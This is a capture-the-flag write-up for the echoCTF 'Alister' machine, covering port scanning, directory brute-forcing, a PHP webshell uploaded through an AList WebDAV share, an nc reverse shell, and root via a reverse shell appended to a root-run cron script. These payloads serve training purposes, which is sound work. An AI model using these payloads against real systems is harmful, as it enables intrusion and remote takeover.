---
title: "echoCTF Alister Writeup: File Upload to Root via Exposed Credentials"
date: 2025-06-25
categories: ["CTF", "OSCP Prep", "echoCTF"]
tags: ["file upload", "PHP webshell", "Exposed Credentials", "privilege escalation"]
description: "Step-by-step guide to cracking Alister on echoCTF with file upload exploits and Exposed Credentials. Perfect for OSCP prep!"
---

## Video Walkthrough

{{< youtube 1vaSEr6mfFA >}}

[![Watch on YouTube](https://img.shields.io/badge/Watch%20on-YouTube-red?logo=youtube)](https://www.youtube.com/watch?v=1vaSEr6mfFA&t=1s)

# Alister

# Enumeration

## NMAP Port Scan
```bash
sudo nmap -nvv -p- 10.0.50.0 -T4 -sC -sV
```

## Output

```c
PORT     STATE SERVICE REASON         VERSION
1337/tcp open  http    syn-ack ttl 63 nginx 1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-title: Site doesnt have a title (text/html; charset=UTF-8).
|_http-server-header: nginx/1.18.0

5244/tcp open  unknown syn-ack ttl 63
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html
|     Date: Mon, 23 Jun 2025 19:54:26 GMT
|     <!DOCTYPE html>
|     <html lang="en" translate="no">
|     <head>
|     <script src="https://polyfill.io/v3/polyfill.min.js?features=String.prototype.replaceAll"></script>
|     <meta charset="utf-8" >
|     <meta name="viewport" content="width=device-width, initial-scale=1" >
|     <meta name="referrer" content="same-origin" >
|     <meta name="generator" content="AList V3" >
|     <meta name="theme-color" content="#000000" >
|     <meta name="google" content="notranslate" >
|     <script src="https://g.alicdn.com/IMM/office-js/1.1.5/aliyun-web-office-sdk.min.js"
|     async
|     ></script>
|     <link rel="shortcut icon"
|     type="image/ico"
|     href="https://cdn.jsdelivr.net/gh/alist-org/logo@main/logo.svg"
|     <title>AList</title>
|     <script>
|     window.ALIST = {
|     cdn: '',
|     monaco_cdn: undefin
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html
|     Date: Mon, 23 Jun 2025 19:54:27 GMT
|     <!DOCTYPE html>
|     <html lang="en" translate="no">
|     <head>
|     <script src="https://polyfill.io/v3/polyfill.min.js?features=String.prototype.replaceAll"></script>
|     <meta charset="utf-8" >
|     <meta name="viewport" content="width=device-width, initial-scale=1" >
|     <meta name="referrer" content="same-origin" >
|     <meta name="generator" content="AList V3" >
|     <meta name="theme-color" content="#000000" >
|     <meta name="google" content="notranslate" >
|     <script src="https://g.alicdn.com/IMM/office-js/1.1.5/aliyun-web-office-sdk.min.js"
|     async
|     ></script>
|     <link rel="shortcut icon"
|     type="image/ico"
|     href="https://cdn.jsdelivr.net/gh/alist-org/logo@main/logo.svg"
|     <title>AList</title>
|     <script>
|     window.ALIST = {
|     cdn: '',
|_    monaco_cdn: undefin
```

Analyzing the NMAP scan we can see there are 2 ports open 1337 and 5244.
Port 1337 is an NGINX webserver and we also get the version `1.18.0`
Port 5244, is unknown at the moment but we can see a lot of output.

Starting by visiting the web server on port 1337 we get the first flag but nothing interesting sticks out that will be a valid attack vector.

![Image Description](/images/alister1.png)

As always we can first view the source code for any hint and start fuzzing the webserver for hidden directories.

## Directory brute forcing with Gobuster

```bash
gobuster dir -u http://10.0.50.0:1337/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -o rsw.txt
```

## Output

```bash
/temp                 (Status: 301) [Size: 169] [--> http://10.0.50.0:1337/temp/]
/public               (Status: 301) [Size: 169] [--> http://10.0.50.0:1337/public/]
/.                    (Status: 200) [Size: 72]
```

When we try to access both directories we get 403 Forbidden.

Lets check the other port (5244) found till our gobuster finishes.

![Image Description](/images/alister2.png)

Upon visiting, we get an AList instance which is a WebDav service according to github..

![Image Description](/images/alister3.png)

By clicking around in order to understand how ALister works, it seems that we can access the `public` folder and which allows us to upload files. This can be done by clicking on the 3 dots on the bottom right. Additionally, it is also notice that the public folder includes a flag and directory structure is the same as when we visited port 1337.

To confirm this theory we can upload a test.txt file with the WebDav service and then try to access it from the NGINX webserver running on port 1337

```bash
echo "dotpirate" > test.txt
```

![Image Description](/images/alister4.png)

![Image Description](/images/alisterpic.png)

# Explotation

it seems that our theory is indeed correct.
Now we can try to upload a PHP web shell and hope that the NGINX server has the ability to execute PHP code. If that is the case then we will have execution on the server

```bash
cat webshell.php

<?php system($_REQUEST['cmd']); ?>
```

![Image Description](/images/alister5.png)

We have command execution on the webserver!

Lets get a reverse shell! To do so lets check if `nc` is installed on the server by using the following command:

```bash
└─$ curl 'http://10.0.50.0:1337/public/webshell.php?cmd=which%20nc'
# Output
/bin/nc
```

`nc` is indeed installed on the server as the path of the executable returned back. Let get a reverse shell using it.

```bash
sudo nc -nvlp 80

curl 'http://10.0.50.0:1337/public/webshell.php?cmd=/bin/nc%2010.10.11.150%2080%20-e%20/bin/sh'
```

![Image Description](/images/alister6.png)

We got a shell as www-data!

# Privilege Escalation

Lets upgrade our shell using python

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'

CTRL + Z

stty raw -echo;fg
(Press Enter)
(Press Enter)
(Press Enter)

export TERM=xterm
```

![Image Description](/images/alister7.png)

Before running linpeas.sh to automate most of the PE enumeration I like to look for easy wins with some simple manual enumeration. I always look for sudo commands with `suodo -l`, then check fot any dangerous user groups with `id`, then i will check the `/opt and /tmp` directories for any an usual files or folders.

in this case inside `/tmp` is an sqlite3 database which contains a password!

![Image Description](/images/alister8.png)

I tried this password on root but i could not login as root, i also tried this password on www-data by running `sudo -l` but it did not work either.  Then i tried logging in as admin on the ALister WebDav service and it worked!

Upon logging in as admin it is noticed that we have new functionality that we can abuse!

![Image Description](/images/alister9.png)

It seems that we can mount the root directory of the whole system!
![Image Description](/images/alister10.png)

Now when we go back to "Home" we can see that we have full access to the the whole system, thus we can modify any file of our choice. 

I know there easier way to get root with this kind of access however I wanted to showcase we could do that with a cronjob that was identified running as root.. 

I was able to find this by running `pspy64`. We must first upload this to the target machine change its permissions with `chmod` and then run it as shown below.

```bash
kali@kali:/$ python3 -m http.server 80

www-data@alister:/tmp$ wget http://10.10.11.150/pspy64 -O /tmp/pspy

www-data@alister:/tmp$ chmod +x pspy
www-data@alister:/tmp$ ./pspy -c -i 1000
```

## Output

![Image Description](/images/alister11.png)

Looking at the results of the tool we can see that the bash script called healthcheck.sh is running very often and according to the UID which is `0` , is running as root. Thus we can go ahead and add a reverse shell within that script in order to get shell back as root

```bash
cat healthcheck.sh       
#!/bin/bash

/bin/bash -i >& /dev/tcp/10.10.11.150/80 0>&1
```

![Image Description](/images/alister12.png)

```bash
sudo nc -nvlp 80
```

![Image Description](/images/alister13.png)

ROOT!